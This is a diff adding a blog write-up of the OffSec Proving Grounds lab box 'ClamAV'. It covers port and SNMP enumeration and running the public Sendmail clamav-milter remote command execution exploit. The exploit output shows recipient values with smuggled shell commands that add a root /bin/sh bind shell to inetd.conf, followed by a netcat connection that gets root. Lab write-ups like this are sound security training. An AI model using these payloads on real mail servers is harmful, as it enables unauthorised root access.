@@ -1,0 +1,178 @@
+<p>ClamAV is a Linux machine from Offsec’s Learning Plataform: <a href="https://portal.offsec.com/labs/practice">Proving Grounds</a>.</p>
+
+<p>The name reflects an open-source antivirus engine.</p>
+
+<p>Let’s begin!</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>I started off by firing up <code class="language-plaintext highlighter-rouge">rustscan</code> since it’s faster lol, and to give me an overview of the open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿anakin<span class="o">)</span>-[~/offsec/ClamAV]
+└─<span class="nv">$ </span>rustscan <span class="nt">-r</span> 1-65535 <span class="nt">--scripts</span> none <span class="nt">-a</span> 192.168.199.42 
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
+| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
+<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+😵 https://admin.tryhackme.com
+
+Open 192.168.199.42:22
+Open 192.168.199.42:25
+Open 192.168.199.42:80
+Open 192.168.199.42:139
+Open 192.168.199.42:199
+Open 192.168.199.42:445
+Open 192.168.199.42:60000
+192.168.199.42 -&gt; [22,25,80,139,199,445,60000]
+</span></code></pre></div></div>
+
+<p>Then a nmap scan to check for services.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿anakin<span class="o">)</span>-[~/offsec/ClamAV]
+└─<span class="nv">$ </span>nmap <span class="nt">-sCV</span> <span class="nt">-T5</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-v</span> 192.168.199.42       
+Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-06-24 11:08 EDT
+<span class="o">[</span>...]
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d <span class="o">(</span>DSA<span class="o">)</span>
+|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 <span class="o">(</span>RSA<span class="o">)</span>
+25/tcp  open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
+| smtp-commands: localhost.localdomain Hello <span class="o">[</span>192.168.45.249], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
+|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use <span class="s2">"HELP &lt;topic&gt;"</span><span class="nb">.</span> 2.0.0 To report bugs <span class="k">in </span>the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For <span class="nb">local </span>information send email to Postmaster at your site. 2.0.0 End of HELP info
+80/tcp  open  http        Apache httpd 1.3.33 <span class="o">((</span>Debian GNU/Linux<span class="o">))</span>
+|_http-server-header: Apache/1.3.33 <span class="o">(</span>Debian GNU/Linux<span class="o">)</span>
+| http-methods: 
+|   Supported Methods: GET HEAD OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+|_http-title: Ph33r
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+199/tcp open  smux        Linux SNMP multiplexer
+445/tcp open  netbios-P   Samba smbd 3.0.14a-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+Service Info: Host: localhost.localdomain<span class="p">;</span> OSs: Linux, Unix<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Unix <span class="o">(</span>Samba 3.0.14a-Debian<span class="o">)</span>
+|   NetBIOS computer name: 
+|   Workgroup: WORKGROUP<span class="se">\x</span>00
+|_  System <span class="nb">time</span>: 2023-06-24T15:08:13-04:00
+| nbstat: NetBIOS name: 0XBABE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+| Names:
+|   0XBABE&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|   0XBABE&lt;03&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|   0XBABE&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|   <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: share <span class="o">(</span>dangerous<span class="o">)</span>
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+|_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>
+|_clock-skew: mean: 5h59m46s, deviation: 2h49m42s, median: 3h59m46s
+</code></pre></div></div>
+<p>There’s a lot of info, this is because this box have a lot of rabbit holes and I got stuck in a few of them, so you’re free to check all the ports.</p>
+
+<p>For example on Port 80:</p>
+
+<p><img src="/assets/img/clamav/80.jpg" alt="port" /></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">CyberChef</code> to decode from Binary.</p>
+
+<p><img src="/assets/img/clamav/cyberchef.jpg" alt="cyber" /></p>
+
+<p>Dead end! lulz</p>
+
+<h2 id="enumerating-snmp">Enumerating SNMP</h2>
+
+<p>Since the name of the box is <code class="language-plaintext highlighter-rouge">ClamAV</code> we can check that SNMP for some clue.</p>
+
+<p>Thanks <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">hacktricks</a>!</p>
+
+<p>Enumerating a bit more we find:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿anakin<span class="o">)</span>-[~/offsec/ClamAV]
+└─<span class="nv">$ </span>snmp-check 192.168.199.42 
+snmp-check v1.9 - SNMP enumerator
+Copyright <span class="o">(</span>c<span class="o">)</span> 2005-2015 by Matteo Cantoni <span class="o">(</span>www.nothink.org<span class="o">)</span>
+
+<span class="o">[</span>+] Try to connect to 192.168.199.42:161 using SNMPv1 and community <span class="s1">'public'</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> System information:
+<span class="o">[</span>...]
+runnable    clamav-milter   /usr/local/sbin/clamav-milter  <span class="nt">--black-hole-mode</span> <span class="nt">-l</span> <span class="nt">-o</span> <span class="nt">-q</span> /var/run/clamav/clamav-milter.ctl
+</code></pre></div></div>
+
+<p>It says it’s running <code class="language-plaintext highlighter-rouge">clamav-milter</code>, so let’s check searchsploit for <code class="language-plaintext highlighter-rouge">Sendmail clamav-milter</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿anakin<span class="o">)</span>-[~/offsec/ClamAV]
+└─<span class="nv">$ </span>searchsploit Sendmail clamav-milter
+<span class="nt">---------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                         |  Path
+<span class="nt">---------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Sendmail with clamav-milter &lt; 0.91.2 - Remote Command Execution                        | multiple/remote/4761.pl
+<span class="nt">---------------------------------------------------------------------------------------</span> 
+</code></pre></div></div>
+
+<p>Bingo! This is the one <code class="language-plaintext highlighter-rouge">Sendmail with clamav-milter &lt; 0.91.2 - Remote Command Execution</code>.</p>
+
+<h2 id="executing-the-exploit">Executing the exploit</h2>
+
+<p>Checking the code, we need to give the IP so it opens a new port we can connect to.</p>
+
+<p><img src="/assets/img/clamav/code.jpg" alt="code" /></p>
+
+<p>We execute it like this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿anakin<span class="o">)</span>-[~/offsec/ClamAV]
+└─<span class="nv">$ </span>perl 4761.pl 192.168.199.42
+Sendmail w/ clamav-milter Remote Root Exploit
+Copyright <span class="o">(</span>C<span class="o">)</span> 2007 Eliteboy
+Attacking 192.168.199.42...
+220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3<span class="p">;</span> Sat, 24 Jun 2023 15:23:50 <span class="nt">-0400</span><span class="p">;</span> <span class="o">(</span>No UCE/UBE<span class="o">)</span> logging access from: <span class="o">[</span>192.168.45.249]<span class="o">(</span>FAIL<span class="o">)</span>-[192.168.45.249]
+250-localhost.localdomain Hello <span class="o">[</span>192.168.45.249], pleased to meet you
+250-ENHANCEDSTATUSCODES
+250-PIPELINING
+250-EXPN
+250-VERB
+250-8BITMIME
+250-SIZE
+250-DSN
+250-ETRN
+250-DELIVERBY
+250 HELP
+250 2.1.0 &lt;<span class="o">&gt;</span>... Sender ok
+250 2.1.5 &lt;nobody+<span class="s2">"|echo '31337 stream tcp nowait root /bin/sh -i' &gt;&gt; /etc/inetd.conf"</span><span class="o">&gt;</span>... Recipient ok
+250 2.1.5 &lt;nobody+<span class="s2">"|/etc/init.d/inetd restart"</span><span class="o">&gt;</span>... Recipient ok
+354 Enter mail, end with <span class="s2">"."</span> on a line by itself
+250 2.0.0 35OJNoHH004194 Message accepted <span class="k">for </span>delivery
+221 2.0.0 localhost.localdomain closing connection
+</code></pre></div></div>
+<h2 id="connecting-with-netcat">Connecting with Netcat</h2>
+
+<p>Right now, we only connect to the new open port at <code class="language-plaintext highlighter-rouge">31337</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿anakin<span class="o">)</span>-[~/offsec/ClamAV]
+└─<span class="nv">$ </span>nc <span class="nt">-nv</span> 192.168.199.42 31337
+<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.199.42] 31337 <span class="o">(</span>?<span class="o">)</span> open
+<span class="nb">id</span> &amp; <span class="nb">whoami</span> &amp; <span class="nb">hostname</span> &amp; <span class="nb">cat</span> /root/proof.txt
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root
+0xbabe.local
+d594[redacted]5da85e
+</code></pre></div></div>
+
+<p>And we are root! No need for privesc.</p>
+
+<p>Happy hacking!</p>
+
+<p><img src="/assets/img/smb/kamusari.png" alt="kamusari" /></p>
+
